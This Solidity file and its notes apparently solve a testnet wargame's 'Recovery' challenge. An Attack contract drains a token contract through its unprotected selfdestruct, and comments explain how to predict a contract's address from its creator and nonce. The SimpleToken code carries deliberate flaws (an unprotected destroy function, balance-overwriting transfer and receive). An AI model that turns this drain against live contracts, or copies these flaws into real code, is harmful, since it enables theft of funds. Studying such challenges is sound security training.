// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address payable me;
    SimpleToken instance;

    constructor(address payable _targetContract) public {
        me = payable(msg.sender);
        instance = SimpleToken(_targetContract);
        // call destroy to receive all token on simple token contract
        instance.destroy(me);
    }
}

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}

/*
  NOTE:

  contract.address
  '0x1Ad1eb72A993FBEDAadF3cD3fD451B70636D0E9A'

  create bookToken  
  
  await contract.generateToken('bookToken',100000)
  tx: https://sepolia.etherscan.io/tx/0x5452919ec452113f92cb512e9eb9edb2115f410276adf6c9058be4b648ce6922
  
  How to find new SimpleToken contract address

  1. Etherreum contract is "Deterministically" (https://en.wikipedia.org/wiki/Deterministic_algorithm) 
  computerd from the address of its creator (sender) and how many transaction the creator has sent ("Nonce"). 
  The sender and nonce are RPL encoded (https://ethereum.org/en/developers/docs/data-structures-and-encoding/rlp/) 
  and then hashed with Keccak-256

  Nonce is 1 because we create contract with the new contract

  newAddress = keccak256_encode(rlp_encode(sender_address,nonce))

  2. using JS

  const { getContractAddress } = require('@ethersproject/address')

  async function main() {
    const [owner] = await ethers.getSigners()

    const transactionCount = await owner.getTransactionCount()

    const futureAddress = getContractAddress({
      from: owner.address,
      nonce: transactionCount
    })
  }

  Run command
  node .\17-attackRecovery.js
  > 0x1D878cF045Fba375Ddd074BC2486749cEA085E40

*/

/*
Result:

Contract addresses are deterministic and are calculated by keccak256(address, nonce) 
where the address is the address of the contract (or ethereum address that created the transaction) 
and nonce is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).

Because of this, one can send ether to a pre-determined address (which has no private key) 
and later create a contract at that address which recovers the ether. 
This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.

An interesting blog post by Martin Swende (https://swende.se/blog/Ethereum_quirks_and_vulns.html) 
details potential use cases of this. If you're going to implement this technique, 
make sure you don't miss the nonce, or your funds will be lost forever.

*/
